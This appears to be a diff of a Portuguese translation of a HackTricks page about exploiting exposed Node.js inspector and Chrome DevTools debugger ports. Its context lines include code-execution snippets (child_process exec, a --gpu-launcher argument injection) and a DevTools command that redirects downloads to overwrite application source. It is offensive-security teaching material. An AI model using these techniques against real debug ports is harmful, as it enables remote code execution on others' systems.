@@ -10,19 +10,19 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 {% endhint %}
 
 ## Basic Information
 
-[Dos documentos](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando iniciado com o switch `--inspect`, um processo Node.js escuta por um cliente de depuração. Por **padrão**, ele escutará no host e porta **`127.0.0.1:9229`**. Cada processo também é atribuído um **UUID** **único**.
+[Dos docs](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Quando iniciado com o switch `--inspect`, um processo Node.js escuta por um cliente de depuração. Por **padrão**, ele escutará no host e porta **`127.0.0.1:9229`**. Cada processo também é atribuído um **UUID** **único**.
 
 Os clientes do Inspector devem conhecer e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa se parecerá com `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.
 
 {% hint style="warning" %}
-Uma vez que o **debugger tem acesso total ao ambiente de execução do Node.js**, um ator malicioso capaz de se conectar a esta porta pode ser capaz de executar código arbitrário em nome do processo Node.js (**potencial escalonamento de privilégios**).
+Como o **debugger tem acesso total ao ambiente de execução do Node.js**, um ator malicioso capaz de se conectar a esta porta pode ser capaz de executar código arbitrário em nome do processo Node.js (**potencial escalonamento de privilégios**).
 {% endhint %}
 
 Existem várias maneiras de iniciar um inspector:
@@ -52,7 +52,7 @@ DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4
 Sites abertos em um navegador da web podem fazer solicitações WebSocket e HTTP sob o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um id de sessão de depuração exclusivo**. A **política de mesma origem** **impede** que sites consigam fazer **essa conexão HTTP**. Para segurança adicional contra [**ataques de reatribuição de DNS**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** o Node.js verifica se os **'Host' headers** para a conexão especificam um **endereço IP** ou **`localhost`** ou **`localhost6`** precisamente.
 
 {% hint style="info" %}
-Essas **medidas de segurança impedem a exploração do inspetor** para executar código **apenas enviando uma solicitação HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).
+Essas **medidas de segurança impedem a exploração do inspetor** para executar código apenas **enviando uma solicitação HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).
 {% endhint %}
 
 ### Iniciando o inspetor em processos em execução
@@ -68,7 +68,7 @@ Isso é útil em contêineres porque **encerrar o processo e iniciar um novo** c
 
 ### Conectar ao inspetor/debugger
 
-Para se conectar a um **navegador baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas para Chrome ou Edge, respectivamente. Ao clicar no botão Configurar, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Execução Remota de Código (RCE):
+Para conectar a um **navegador baseado em Chromium**, as URLs `chrome://inspect` ou `edge://inspect` podem ser acessadas para Chrome ou Edge, respectivamente. Ao clicar no botão Configurar, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Execução Remota de Código (RCE):
 
 ![](<../../.gitbook/assets/image (674).png>)
 
@@ -95,10 +95,10 @@ Note que **explorações RCE do NodeJS não funcionarão** se conectadas a um na
 ## RCE no Depurador/Inspector do NodeJS
 
 {% hint style="info" %}
-Se você veio aqui procurando como obter [**RCE a partir de um XSS no Electron, por favor, verifique esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
+Se você veio aqui procurando como obter [**RCE de um XSS no Electron, por favor, verifique esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
 {% endhint %}
 
-Algumas maneiras comuns de obter **RCE** quando você pode **conectar** a um **inspector** do Node é usando algo como (parece que isso **não funcionará em uma conexão com o protocolo Chrome DevTools**):
+Algumas maneiras comuns de obter **RCE** quando você pode **conectar** a um **inspector** do Node é usar algo como (parece que isso **não funcionará em uma conexão com o protocolo Chrome DevTools**):
 ```javascript
 process.mainModule.require('child_process').exec('calc')
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -122,9 +122,9 @@ workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
 Executará um calc.exe.
 
-### Sobrescrever Arquivos
+### Substituir Arquivos
 
-Altere a pasta onde **os arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** o **código fonte** frequentemente usado da aplicação com seu **código malicioso**.
+Altere a pasta onde **os arquivos baixados serão salvos** e baixe um arquivo para **substituir** o **código fonte** frequentemente usado da aplicação pelo seu **código malicioso**.
 ```javascript
 ws = new WebSocket(url); //URL of the chrome devtools service
 ws.send(JSON.stringify({
@@ -138,7 +138,7 @@ downloadPath: '/code/'
 ```
 ### Webdriver RCE e exfiltração
 
-De acordo com este post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148), é possível obter RCE e exfiltrar páginas internas do theriver.
+De acordo com este post: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) é possível obter RCE e exfiltrar páginas internas do theriver.
 
 ### Pós-Exploração
 
@@ -167,7 +167,7 @@ Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data
 
 <details>
 
-<summary>Suporte ao HackTricks</summary>
+<summary>Support HackTricks</summary>
 
 * Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
 * **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
